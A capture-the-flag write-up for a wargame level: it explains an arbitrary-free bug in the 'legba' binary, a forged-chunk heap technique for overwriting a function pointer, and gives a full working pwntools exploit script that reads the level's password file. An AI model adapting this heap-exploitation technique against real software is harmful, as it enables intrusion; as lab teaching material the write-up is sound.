# Level06 - Crossroads Allocator Exploit

## Vulnerability Analysis

The binary `legba` contains a **use-after-free / arbitrary free** vulnerability in the `cmd_open` function:

```c
static void cmd_open(void) {
    printf("addr: "); fflush(stdout);
    free((void *)rd_long());
    puts("[LEGBA] a path opens.");
}
```

This allows freeing **any arbitrary address** provided by the user.

### Information Leaks

The `main` function leaks two critical addresses:

```c
printf("[LEGBA] veve @ %p\n", (void *)win);      // win() function address
printf("[LEGBA] gate @ %p\n", (void *)&g.path);   // g.path function pointer address
```

### Global Structure

```c
static struct gate_s {
    char _pad[8];
    size_t guard;
    void (*path)(void);
    char slack[32];
} g __attribute__((aligned(16)));
```

The `g` struct layout (16-byte aligned):
- Offset 0x00: `_pad[8]` (8 bytes)
- Offset 0x08: `guard` (8 bytes) — controllable via `cmd_mark`
- Offset 0x10: `path` (8 bytes) — function pointer, initially `default_path`
- Offset 0x18: `slack[32]` (32 bytes)

Total size: 56 bytes (0x38) = `CHUNK_SIZE`

## Exploit Strategy

1. **Leak addresses** — Read `win` and `&g.path` from program output
2. **Forge chunk metadata** — Use `cmd_mark` to set `g.guard = 0x41` (valid malloc chunk size for 0x38-byte chunk with PREV_INUSE bit)
3. **Free the function pointer** — Call `cmd_open` with `&g.path` as the address to free. This places the `g` struct into the tcache/fastbin.
4. **Reallocate the chunk** — Call `cmd_claim` to `malloc(CHUNK_SIZE)`, which returns `&g.path` (the freed chunk)
5. **Overwrite function pointer** — Use `cmd_write` to write `win` address at offset 0 (which maps to `g.path`)
6. **Trigger win** — Call `cmd_cross` which executes `g.path()`, now pointing to `win()`

### Why This Works

- `g.guard` at offset 0x8 serves as the **size field** of the fake chunk when `&g.path` (offset 0x10) is freed
- Setting `guard = 0x41` (65 = 0x40 + PREV_INUSE) makes it a valid 0x40-byte chunk (0x38 user + 0x8 metadata)
- Freeing `&g.path` actually frees the chunk starting at `&g.guard` (0x8 bytes before)
- `malloc(0x38)` returns the same address (`&g.path`), letting us overwrite the function pointer

## Exploit Script

```python
from pwn import *

context.log_level = 'info'
context.arch = 'arm64'

TIMEOUT = 1
target = "./legba"

def connect():
    return process(target, env={})

def freeAddress(address):
    p.recvuntil(b"> ")
    p.send(b'2')
    p.recvuntil(b'addr: ')
    p.send(address)

def allocate():
    p.recvuntil(b"> ")
    p.send(b'3')

def editBuffer(data):
    p.recvuntil(b"> ")
    p.send(b'4')
    p.recvuntil(b'data: ')
    p.send(data)

def callfunc_ptr():
    p.recvuntil(b"> ")
    p.send(b'5')

def recvline():
    return p.recvline(timeout=TIMEOUT).strip()

p = connect()

# Skip banner lines
recvline()
recvline()

# Leak win address
recv = recvline()
leaked_win = int(recv[len(b'\x1b[0m[LEGBA] veve @ '):], 16)
print("leaked win address :", hex(leaked_win))

# Leak g.path address
recv = recvline()
leaked_path = int(recv[len(b'[LEGBA] gate @ '):], 16)
print("leaked path :", hex(leaked_path))

# Set g.guard to valid chunk size (0x41 = 0x40 | PREV_INUSE)
p.recvuntil(b"> ")
p.send(b'1')
p.recvuntil(b'size: ')
p.send(b'65')

# Free the g.path address (actually frees chunk at &g.guard)
freeAddress(str(leaked_path).encode())

# Allocate - returns &g.path
allocate()

# Overwrite g.path with win address
payload = p64(leaked_win) + b'A' * (0x38 - 8)
editBuffer(payload)

# Trigger win()
callfunc_ptr()

# Get flag
p.send(b"cat /home/flag06/.pass\n")
print(f"flag{{{recvline().decode()}}}")
p.interactive()
```
